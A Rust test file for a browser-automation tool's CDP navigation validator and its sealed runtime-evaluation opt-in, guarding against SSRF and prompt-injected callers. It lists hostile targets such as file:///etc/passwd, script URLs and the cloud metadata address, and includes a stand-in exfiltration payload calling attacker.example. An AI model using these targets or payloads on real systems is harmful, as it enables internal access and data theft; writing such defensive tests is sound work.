//! #2884 — regression tests for the CDP browser navigation validator and the
//! explicit runtime-evaluation capability. These are pure policy tests: they
//! never contact a CDP endpoint or a browser.

use super::*;

#[test]
fn cdp_base_defaults_to_localhost_9222() {
    std::env::remove_var("BROWSER_CDP_URL");
    assert_eq!(cdp_base(), "http://127.0.0.1:9222");
    std::env::set_var("BROWSER_CDP_URL", "http://example.com:9223");
    assert_eq!(cdp_base(), "http://example.com:9223");
    std::env::remove_var("BROWSER_CDP_URL");
}

#[test]
fn navigation_allows_public_targets() {
    for good in [
        "https://example.com",
        "http://chat.example.com:8080/",
        "https://example.com/path?q=1#frag",
    ] {
        assert!(validate_navigation_target(good).is_ok(), "should allow {good}");
    }
}

#[test]
fn navigation_rejects_malicious_and_internal_targets() {
    // #2884 — schemes, userinfo smuggling, loopback/private/link-local IPs,
    // encoded IPv4, metadata hosts and control-plane ports are all refused by
    // the shared SSRF guard, not by a local string/parse check.
    let bad_targets = [
        "file:///etc/passwd",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "http://user:pass@example.com/",
        "http://example.com@127.0.0.1/",
        "http://127.0.0.1:9222/json/new",
        "http://localhost:3000/",
        "http://10.0.0.5/",
        "http://192.168.1.1/",
        "http://172.16.0.1/",
        "http://100.64.0.1/",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]/",
        "http://2130706433/",
        "http://0x7f000001/",
        "http://127.1/",
        "https://app.internal/",
        "https://foo.local/",
        "https://localhost.localdomain/",
        "http://metadata.google.internal/",
        "http://example.com:6379/",
        "ftp://example.com",
        "not-a-url",
        "",
    ];
    for target in bad_targets {
        let result = validate_navigation_target(target);
        assert!(result.is_err(), "should block {target}");
        // The shared SSRF error is generic: it must not reflect the rejected
        // host back to a prompt-injected caller.
        let message = result.expect_err("checked above").to_string();
        assert!(!message.contains("127.0.0.1"), "host leaked in error: {message}");
    }
}

#[test]
fn eval_capability_requires_exact_opt_in_token() {
    std::env::remove_var(CDP_EVAL_OPT_IN_ENV);
    assert_eq!(CdpEvalCapability::from_env(), None);

    // A loose string check ("true"/"1"/"allow") must never grant the
    // capability — only the exact, typed opt-in does.
    for weak in [
        "true",
        "1",
        "yes",
        "allow",
        "grant",
        "grant-cdp-runtime-evaluate ",
        "GRANT-CDP-RUNTIME-EVALUATE",
        "",
    ] {
        std::env::set_var(CDP_EVAL_OPT_IN_ENV, weak);
        assert_eq!(
            CdpEvalCapability::from_env(),
            None,
            "weak token accepted: {weak}"
        );
    }

    std::env::set_var(CDP_EVAL_OPT_IN_ENV, CDP_EVAL_OPT_IN_TOKEN);
    assert_eq!(
        CdpEvalCapability::from_env(),
        Some(CdpEvalCapability { _sealed: () })
    );
    std::env::remove_var(CDP_EVAL_OPT_IN_ENV);
}

#[test]
fn eval_methods_are_recognized() {
    for method in [
        "Runtime.evaluate",
        "Runtime.callFunctionOn",
        "Runtime.awaitPromise",
        "Page.addScriptToEvaluateOnNewDocument",
    ] {
        assert!(is_eval_method(method), "should recognize {method}");
    }
    for method in [
        "Page.captureScreenshot",
        "Page.navigate",
        "Target.getTargets",
        "Runtime.enable",
        "",
    ] {
        assert!(!is_eval_method(method), "should not classify {method} as eval");
    }
}

#[tokio::test]
async fn runtime_evaluate_without_capability_is_refused_before_network() {
    // The guard runs before tab_ws_url(), so a missing capability fails
    // offline even with a tab id that could never exist.
    let result = cdp_call(
        "nonexistent-tab",
        "Runtime.evaluate",
        json!({ "expression": "fetch('http://attacker.example/steal')" }),
        None,
    )
    .await;
    assert!(result.is_err(), "eval without capability must be refused");
    let message = result.expect_err("checked above");
    assert!(
        message.contains("explicit eval capability"),
        "unexpected refusal: {message}"
    );
}
